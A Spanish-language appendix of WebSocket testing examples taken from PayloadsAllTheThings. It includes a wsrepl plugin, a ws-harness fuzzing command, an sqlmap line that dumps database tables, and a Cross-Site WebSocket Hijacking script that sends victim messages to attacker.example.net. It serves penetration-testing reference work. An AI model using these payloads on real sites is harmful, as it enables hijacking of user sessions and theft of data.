# Cross-Site WebSocket Hijacking: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Web Sockets/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Web%20Sockets/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Metodología / Web Socket Protocol

```http
GET /chat HTTP/1.1
Host: example.com:80
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Variantes presentes en tablas o texto del apartado

```text
HTTP/1.1
```

## 2. Metodología / Usando wsrepl

```ps1
pip install wsrepl
wsrepl -u URL -P auth_plugin.py
```

```py
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage

import json
import requests

class Demo(Plugin):
    def init(self):
        token = requests.get("https://example.com/uuid").json()["uuid"]
        self.messages = [
            json.dumps({
                "auth": "session",
                "sessionId": token
            })
        ]

    async def on_message_sent(self, message: WSMessage) -> None:
        original = message.msg
        message.msg = json.dumps({
            "type": "message",
            "data": {
                "text": original
            }
        })
        message.short = original
        message.long = message.msg

    async def on_message_received(self, message: WSMessage) -> None:
        original = message.msg
        try:
            message.short = json.loads(original)["data"]["text"]
        except:
            message.short = "Error: could not parse message"

        message.long = original
```

## 3. Metodología / Usando ws-harness.py

```powershell
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```

```json
{
    "auth_user":"dGVzda==",
    "auth_pass":"[FUZZ]"
}
```

```python
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```

### Variantes presentes en tablas o texto del apartado

```text
ws-harness
```

## 4. Web Sockets / Cross-Site WebSocket Hijacking (CSWSH)

```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```

### Variantes presentes en tablas o texto del apartado

```text
Sec-WebSocket-Protocol
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
